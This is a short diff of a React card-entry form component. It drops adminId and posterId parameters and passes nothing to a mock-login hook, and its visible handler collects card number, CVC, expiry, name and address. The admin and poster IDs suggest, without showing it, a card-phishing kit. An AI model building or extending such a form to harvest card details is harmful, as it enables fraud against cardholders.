@@ -6,13 +6,13 @@ import useMockLogin from "../hooks/useMockLogin";
 import { site } from "../config/index";
 import WaitingPage from "./waiting";
 
-function CardForm({ params }) {
-  const { adminId, posterId } = params;
-  console.log(adminId, posterId);
+function CardForm() {
+  // const { adminId, posterId } = params;
+  // console.log(adminId, posterId);
   const [showModal, setShowModal] = useState(false);
   const form = useForm();
   const { register, handleSubmit, reset } = form;
-  const { login } = useMockLogin(adminId, posterId);
+  const { login } = useMockLogin();
 
   const onSubmit = (values) => {
     const { validity, address, cardNumber, cvc, name, zipCode } = values;
